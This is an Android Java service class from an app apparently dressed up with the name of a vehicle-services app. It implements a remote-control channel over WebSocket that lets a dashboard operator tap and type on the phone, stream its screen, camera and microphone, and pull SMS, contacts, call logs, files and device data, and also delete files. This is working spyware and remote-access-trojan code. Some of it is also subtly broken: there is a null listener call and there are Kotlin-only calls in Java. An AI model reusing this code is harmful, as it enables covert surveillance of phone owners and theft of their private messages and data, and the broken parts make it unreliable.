package com.remoteadmin.mparivahan.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.remoteadmin.mparivahan.R;
import com.remoteadmin.mparivahan.ui.MainActivity;

import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.nio.ByteBuffer;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;
import okio.ByteString.Companion.toByteString;
import org.json.JSONObject;
import org.json.JSONException;

/**
 * ConnectionService - Maintains the persistent WebSocket connection to the
 * signaling server. Handles all incoming commands from the dashboard and
 * dispatches them to the appropriate service.
 *
 * Message Protocol (JSON):
 *
 * Command Messages (dashboard → phone):
 *   {"type": "command", "action": "tap", "x": 540, "y": 960}
 *   {"type": "command", "action": "swipe", "sx": 100, "sy": 500, "ex": 100, "ey": 200, "dur": 300}
 *   {"type": "command", "action": "key", "keycode": 4}  // Back
 *   {"type": "command", "action": "text", "text": "hello"}
 *   {"type": "command", "action": "launch", "package": "com.android.settings"}
 *   {"type": "command", "action": "startScreenCapture"}
 *   {"type": "command", "action": "stopScreenCapture"}
 *   {"type": "command", "action": "startCamera", "front": true}
 *   {"type": "command", "action": "stopCamera"}
 *   {"type": "command", "action": "startMic"}
 *   {"type": "command", "action": "stopMic"}
 *   {"type": "command", "action": "getFiles", "path": "/sdcard/"}
 *   {"type": "command", "action": "getContacts"}
 *   {"type": "command", "action": "getSms", "limit": 50}
 *   {"type": "command", "action": "getCallLogs", "limit": 50}
 *   {"type": "command", "action": "getDeviceInfo"}
 *   {"type": "command", "action": "getInstalledApps"}
 *
 * Data Messages (phone → dashboard):
 *   {"type": "screenFrame", "data": "<base64>", "w": 1080, "h": 1920}
 *   {"type": "cameraFrame", "data": "<base64>", "front": true}
 *   {"type": "audioData", "data": "<base64>", "sampleRate": 16000}
 *   {"type": "contacts", "data": "[...]"}
 *   {"type": "sms", "data": "[...]"}
 *   {"type": "callLogs", "data": "[...]"}
 *   {"type": "files", "data": "{...}"}
 *   {"type": "deviceInfo", "data": "{...}"}
 *   {"type": "installedApps", "data": "[...]"}
 *   {"type": "status", "screenCapture": true, "camera": false, "mic": false}
 *   {"type": "error", "message": "..."}
 *   {"type": "connected"}
 *   {"type": "pong"}
 */
public class ConnectionService extends Service {

    private static final String TAG = "ConnectionService";
    private static final String CHANNEL_ID = "connection_channel";
    private static final int NOTIFICATION_ID = 1002;
    private static final long PING_INTERVAL_MS = 15000;
    private static final long RECONNECT_DELAY_MS = 3000;
    private static final long RECONNECT_MAX_DELAY_MS = 60000;

    private WebSocket webSocket;
    private OkHttpClient httpClient;
    private Handler mainHandler;

    private String serverUrl;
    private String deviceId;
    private String authToken;

    private long reconnectDelay = RECONNECT_DELAY_MS;
    private boolean shouldReconnect = true;
    private boolean isAuthenticated = false;

    // Reference to services for command dispatch
    private ScreenCaptureService screenCaptureService;
    private CameraStreamService cameraService;
    private AudioStreamService audioService;
    private DataService dataService;

    // State
    private boolean screenCaptureActive = false;
    private boolean cameraActive = false;
    private boolean micActive = false;

    // WebRTC
    private WebRTCClient webrtcClient;
    private org.webrtc.EglBase eglBase;

    public static ConnectionService instance;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        mainHandler = new Handler(Looper.getMainLooper());
        createNotificationChannel();
        dataService = new DataService(getApplicationContext());

        // Initialize WebRTC client
        try {
            eglBase = org.webrtc.EglBase.create();
            webrtcClient = new WebRTCClient();
            webrtcClient.initialize(eglBase);
        } catch (Exception e) {
            Log.e(TAG, "WebRTC initialization failed (no GPU?)", e);
            webrtcClient = null;
        }
        webrtcClient.setListener(new WebRTCClient.WebRTCListener() {
            @Override public void onOfferReceived() { Log.i(TAG, "WebRTC: offer received"); }
            @Override public void onAnswerSent() { Log.i(TAG, "WebRTC: answer sent"); }
            @Override public void onConnected() { Log.i(TAG, "WebRTC: peer connected"); }
            @Override public void onDisconnected() { Log.i(TAG, "WebRTC: peer disconnected"); }
            @Override public void onError(String error) { Log.e(TAG, "WebRTC error: " + error); }
            @Override public void onSignalingMessage(String message) {
                // Send WebRTC signaling message via WebSocket
                sendSignalingMessage(message);
            }
        });

        httpClient = new OkHttpClient.Builder()
                .pingInterval(PING_INTERVAL_MS, TimeUnit.MILLISECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS)
                .build();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if ("STOP".equals(intent.getAction())) {
            disconnect();
            stopForeground(STOP_FOREGROUND_REMOVE);
            stopSelf();
            return START_NOT_STICKY;
        }

        serverUrl = intent.getStringExtra("serverUrl");
        deviceId = intent.getStringExtra("deviceId");
        authToken = intent.getStringExtra("authToken");

        startForeground(NOTIFICATION_ID, buildNotification("Connecting..."));

        if (serverUrl != null && deviceId != null) {
            connect();
        }

        return START_STICKY;
    }

    private void connect() {
        shouldReconnect = true;

        String wsUrl = serverUrl.replace("http", "ws") + "/ws?deviceId=" + deviceId;
        if (authToken != null) {
            wsUrl += "&token=" + authToken;
        }

        Request request = new Request.Builder()
                .url(wsUrl)
                .build();

        webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(@NonNull WebSocket ws, @NonNull Response response) {
                Log.i(TAG, "WebSocket connected to " + serverUrl);
                reconnectDelay = RECONNECT_DELAY_MS;

                // Send authentication
                try {
                    JSONObject auth = new JSONObject();
                    auth.put("type", "auth");
                    auth.put("deviceId", deviceId);
                    auth.put("token", authToken);
                    ws.send(auth.toString());
                } catch (JSONException e) {
                    Log.e(TAG, "Error sending auth", e);
                }

                updateNotification("Connected");
            }

            @Override
            public void onMessage(@NonNull WebSocket ws, @NonNull String text) {
                handleIncomingMessage(text);
            }

            @Override
            public void onMessage(@NonNull WebSocket ws, @NonNull ByteString bytes) {
                // Binary messages (e.g., screen frames for upload)
                handleIncomingBinary(bytes.toByteArray());
            }

            @Override
            public void onClosing(@NonNull WebSocket ws, int code, @NonNull String reason) {
                ws.close(1000, null);
                handleDisconnect();
            }

            @Override
            public void onClosed(@NonNull WebSocket ws, int code, @NonNull String reason) {
                Log.d(TAG, "WebSocket closed: " + code + " " + reason);
                handleDisconnect();
            }

            @Override
            public void onFailure(@NonNull WebSocket ws, @NonNull Throwable t, Response response) {
                Log.e(TAG, "WebSocket failure: " + t.getMessage());
                handleDisconnect();
            }
        });
    }

    private void handleIncomingMessage(String message) {
        try {
            JSONObject json = new JSONObject(message);
            String type = json.getString("type");

            switch (type) {
                case "auth_success":
                    isAuthenticated = true;
                    sendStatus();
                    Log.i(TAG, "Authentication successful");
                    break;

                case "auth_failure":
                    isAuthenticated = false;
                    Log.e(TAG, "Authentication failed");
                    updateNotification("Auth failed");
                    disconnect();
                    break;

                case "command":
                    dispatchCommand(json.getJSONObject("payload"));
                    break;

                // ─── WebRTC Signaling ──────────────────────────────────────
                case "webrtc_offer":
                    Log.i(TAG, "Received WebRTC offer from dashboard");
                    handleWebRTCOffer(json);
                    break;

                case "webrtc_answer":
                    Log.i(TAG, "Received WebRTC answer from dashboard");
                    handleWebRTCAnswer(json);
                    break;

                case "webrtc_ice":
                    Log.d(TAG, "Received WebRTC ICE candidate");
                    handleWebRTCICE(json);
                    break;

                case "ping":
                    JSONObject pong = new JSONObject();
                    pong.put("type", "pong");
                    pong.put("ts", System.currentTimeMillis());
                    webSocket.send(pong.toString());
                    break;

                case "pong":
                    // Connection alive
                    break;

                default:
                    Log.w(TAG, "Unknown message type: " + type);
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error parsing message", e);
        }
    }

    private void dispatchCommand(JSONObject command) {
        try {
            String action = command.getString("action");
            Log.d(TAG, "Dispatching command: " + action);

            switch (action) {
                // ─── Touch & Navigation ───
                case "tap":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().performTap(
                                (float) command.getDouble("x"),
                                (float) command.getDouble("y"));
                    }
                    break;

                case "longPress":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().performLongPress(
                                (float) command.getDouble("x"),
                                (float) command.getDouble("y"));
                    }
                    break;

                case "swipe":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().performSwipe(
                                (float) command.getDouble("sx"),
                                (float) command.getDouble("sy"),
                                (float) command.getDouble("ex"),
                                (float) command.getDouble("ey"),
                                command.optLong("dur", 300));
                    }
                    break;

                case "scrollUp":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().scrollUp();
                    }
                    break;

                case "scrollDown":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().scrollDown();
                    }
                    break;

                case "key":
                    if (RemoteControlService.isRunning()) {
                        int keycode = command.getInt("keycode");
                        handleKeyPress(keycode);
                    }
                    break;

                case "back":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().pressBack();
                    }
                    break;

                case "home":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().pressHome();
                    }
                    break;

                case "recents":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().pressRecents();
                    }
                    break;

                case "text":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().typeText(command.getString("text"));
                    }
                    break;

                case "setText":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().setNodeText(command.getString("text"));
                    }
                    break;

                case "launch":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().launchApp(command.getString("package"));
                    }
                    break;

                case "openSettings":
                    if (RemoteControlService.isRunning()) {
                        RemoteControlService.getInstance().openSettings();
                    }
                    break;

                // ─── Screen Capture ───
                case "startScreenCapture":
                    Intent screenIntent = new Intent(this, ScreenCaptureService.class);
                    screenIntent.putExtra("resultCode", command.optInt("resultCode", -1));
                    // data intent must be passed from the activity
                    startService(screenIntent);
                    screenCaptureActive = true;
                    sendStatus();
                    break;

                case "stopScreenCapture":
                    Intent stopScreen = new Intent(this, ScreenCaptureService.class);
                    stopScreen.setAction("STOP");
                    startService(stopScreen);
                    screenCaptureActive = false;
                    sendStatus();
                    break;

                // ─── Camera ───
                case "startCamera":
                    Intent camIntent = new Intent(this, CameraStreamService.class);
                    camIntent.putExtra("useFrontCamera", command.optBoolean("front", false));
                    camIntent.putExtra("width", command.optInt("width", 1280));
                    camIntent.putExtra("height", command.optInt("height", 720));
                    startService(camIntent);
                    cameraActive = true;
                    sendStatus();
                    break;

                case "stopCamera":
                    Intent stopCam = new Intent(this, CameraStreamService.class);
                    stopCam.setAction("STOP");
                    startService(stopCam);
                    cameraActive = false;
                    sendStatus();
                    break;

                case "switchCamera":
                    if (cameraService != null) {
                        cameraService.switchCamera();
                    }
                    break;

                // ─── Microphone ───
                case "startMic":
                    Intent micIntent = new Intent(this, AudioStreamService.class);
                    startService(micIntent);
                    micActive = true;
                    sendStatus();
                    break;

                case "stopMic":
                    Intent stopMic = new Intent(this, AudioStreamService.class);
                    stopMic.setAction("STOP");
                    startService(stopMic);
                    micActive = false;
                    sendStatus();
                    break;

                // ─── Data Access ───
                case "getContacts":
                    new Thread(() -> {
                        try {
                            String contacts = dataService.getContacts();
                            sendData("contacts", contacts);
                        } catch (Exception e) {
                            sendError("Failed to get contacts: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getSms":
                    new Thread(() -> {
                        try {
                            int limit = command.optInt("limit", 50);
                            String sms = dataService.getSmsMessages(limit);
                            sendData("sms", sms);
                        } catch (Exception e) {
                            sendError("Failed to get SMS: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getCallLogs":
                    new Thread(() -> {
                        try {
                            int limit = command.optInt("limit", 50);
                            String calls = dataService.getCallLogs(limit);
                            sendData("callLogs", calls);
                        } catch (Exception e) {
                            sendError("Failed to get call logs: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getFiles":
                    new Thread(() -> {
                        try {
                            String path = command.optString("path",
                                    android.os.Environment.getExternalStorageDirectory().getAbsolutePath());
                            String files = dataService.getFiles(path);
                            sendData("files", files);
                        } catch (Exception e) {
                            sendError("Failed to get files: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getDeviceInfo":
                    new Thread(() -> {
                        try {
                            String info = dataService.getDeviceInfo();
                            sendData("deviceInfo", info);
                        } catch (Exception e) {
                            sendError("Failed to get device info: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getInstalledApps":
                    new Thread(() -> {
                        try {
                            String apps = dataService.getInstalledApps();
                            sendData("installedApps", apps);
                        } catch (Exception e) {
                            sendError("Failed to get installed apps: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "getUiTree":
                    if (RemoteControlService.isRunning()) {
                        String tree = RemoteControlService.getInstance().getUiTree();
                        sendData("uiTree", tree);
                    }
                    break;

                case "uploadFile":
                    new Thread(() -> {
                        try {
                            String path = command.getString("path");
                            // Base64 data handled in binary message handler
                            sendError("Use binary upload");
                        } catch (Exception e) {
                            sendError("Upload failed: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "downloadFile":
                    new Thread(() -> {
                        try {
                            byte[] fileData = dataService.getFileContent(command.getString("path"));
                            if (fileData != null) {
                                JSONObject fileMsg = new JSONObject();
                                fileMsg.put("type", "fileDownload");
                                fileMsg.put("name", command.getString("path"));
                                fileMsg.put("size", fileData.length);
                                webSocket.send(fileMsg.toString());
                                // Send binary data separately
                                webSocket.send(fileData.toByteString(0, fileData.length));
                            } else {
                                sendError("File not found or inaccessible");
                            }
                        } catch (Exception e) {
                            sendError("Download failed: " + e.getMessage());
                        }
                    }).start();
                    break;

                case "deleteFile":
                    new Thread(() -> {
                        try {
                            boolean deleted = dataService.deleteFile(command.getString("path"));
                            JSONObject result = new JSONObject();
                            result.put("type", "deleteResult");
                            result.put("success", deleted);
                            result.put("path", command.getString("path"));
                            webSocket.send(result.toString());
                        } catch (Exception e) {
                            sendError("Delete failed: " + e.getMessage());
                        }
                    }).start();
                    break;

                default:
                    sendError("Unknown command: " + action);
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error dispatching command", e);
        }
    }

    private void handleKeyPress(int keycode) {
        RemoteControlService rcs = RemoteControlService.getInstance();
        if (rcs == null) return;

        switch (keycode) {
            case 4: rcs.pressBack(); break;
            case 3: rcs.pressHome(); break;
            case 187: rcs.pressRecents(); break;
            case 24: // Volume up
            case 25: // Volume down
            case 26: // Power
                // Global actions handled differently
                break;
        }
    }

    private void handleIncomingBinary(byte[] data) {
        // Handle binary uploads from dashboard
        Log.d(TAG, "Received binary data: " + data.length + " bytes");
    }

    // ─── WebRTC Signaling Handlers ───────────────────────────────────────

    private void handleWebRTCOffer(JSONObject json) {
        // Forward to WebRTCClient for processing
        // The WebRTCClient creates an answer and sends it back via sendSignalingMessage()
        if (webrtcClient != null) {
            try {
                String sdpStr = json.getJSONObject("sdp").getString("sdp");
                org.webrtc.SessionDescription sdp = new org.webrtc.SessionDescription(
                        org.webrtc.SessionDescription.Type.OFFER, sdpStr);
                webrtcClient.handleOffer(sdp);
            } catch (Exception e) {
                Log.e(TAG, "Failed to process WebRTC offer", e);
            }
        } else {
            Log.w(TAG, "WebRTCClient not initialized, ignoring offer");
        }
    }

    private void handleWebRTCAnswer(JSONObject json) {
        if (webrtcClient != null) {
            try {
                String sdpStr = json.getJSONObject("sdp").getString("sdp");
                org.webrtc.SessionDescription sdp = new org.webrtc.SessionDescription(
                        org.webrtc.SessionDescription.Type.ANSWER, sdpStr);
                webrtcClient.handleAnswer(sdp);
            } catch (Exception e) {
                Log.e(TAG, "Failed to process WebRTC answer", e);
            }
        } else {
            Log.w(TAG, "WebRTCClient not initialized, ignoring answer");
        }
    }

    private void handleWebRTCICE(JSONObject json) {
        if (webrtcClient != null) {
            try {
                webrtcClient.handleIceCandidate(json.getJSONObject("candidate"));
            } catch (Exception e) {
                Log.e(TAG, "Failed to process WebRTC ICE candidate", e);
            }
        } else {
            Log.w(TAG, "WebRTCClient not initialized, ignoring ICE");
        }
    }

    public void sendSignalingMessage(String message) {
        if (webSocket != null && isAuthenticated) {
            webSocket.send(message);
        }
    }

    // ─── Send Helpers ───────────────────────────────────────────────────────

    public void sendScreenFrame(byte[] jpegData, int width, int height) {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "screenFrame");
            msg.put("w", width);
            msg.put("h", height);
            msg.put("ts", System.currentTimeMillis());
            // Send metadata as text, frame as binary
            webSocket.send(msg.toString());
            webSocket.send(jpegData.toByteString(0, jpegData.length));
        } catch (JSONException e) {
            Log.e(TAG, "Error sending screen frame", e);
        }
    }

    public void sendCameraFrame(byte[] jpegData, boolean isFrontCamera) {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "cameraFrame");
            msg.put("front", isFrontCamera);
            webSocket.send(msg.toString());
            webSocket.send(jpegData.toByteString(0, jpegData.length));
        } catch (JSONException e) {
            Log.e(TAG, "Error sending camera frame", e);
        }
    }

    public void sendAudioData(byte[] pcmData, int sampleRate) {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "audioData");
            msg.put("sampleRate", sampleRate);
            webSocket.send(msg.toString());
            webSocket.send(pcmData.toByteString(0, pcmData.length));
        } catch (JSONException e) {
            Log.e(TAG, "Error sending audio data", e);
        }
    }

    private void sendData(String type, String data) {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", type);
            msg.put("data", data);
            webSocket.send(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending data", e);
        }
    }

    private void sendError(String error) {
        if (webSocket == null) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "error");
            msg.put("message", error);
            webSocket.send(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }

    private void sendStatus() {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject();
            msg.put("type", "status");
            msg.put("screenCapture", screenCaptureActive);
            msg.put("camera", cameraActive);
            msg.put("mic", micActive);
            msg.put("accessibility", RemoteControlService.isRunning());
            webSocket.send(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending status", e);
        }
    }

    // ─── Connection Management ──────────────────────────────────────────────

    private void handleDisconnect() {
        isAuthenticated = false;
        updateNotification("Disconnected");

        if (shouldReconnect) {
            Log.d(TAG, "Reconnecting in " + reconnectDelay + "ms");
            mainHandler.postDelayed(this::connect, reconnectDelay);
            reconnectDelay = Math.min(reconnectDelay * 2, RECONNECT_MAX_DELAY_MS);
        }
    }

    private void disconnect() {
        shouldReconnect = false;
        isAuthenticated = false;
        if (webSocket != null) {
            webSocket.close(1000, "Client disconnect");
            webSocket = null;
        }
    }

    private void updateNotification(String status) {
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) {
            manager.notify(NOTIFICATION_ID, buildNotification(status));
        }
    }

    private Notification buildNotification(String status) {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,
                notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("RemoteAdmin")
                .setContentText("Status: " + status)
                .setSmallIcon(R.drawable.ic_connection)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    private void createNotificationChannel() {
        NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, "Connection Status", NotificationManager.IMPORTANCE_LOW);
        channel.setDescription("WebSocket connection status notification");
        NotificationManager manager = getSystemService(NotificationManager.class);
        if (manager != null) manager.createNotificationChannel(channel);
    }

    public void sendLocationData(String locationJson) {
        if (webSocket == null || !isAuthenticated) return;
        try {
            JSONObject msg = new JSONObject(locationJson);
            msg.put("type", "location");
            webSocket.send(msg.toString());
        } catch (JSONException e) {
            Log.e(TAG, "Error sending location", e);
        }
    }

    public boolean isConnected() {
        return isAuthenticated;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        disconnect();
        instance = null;
        super.onDestroy();
    }
}
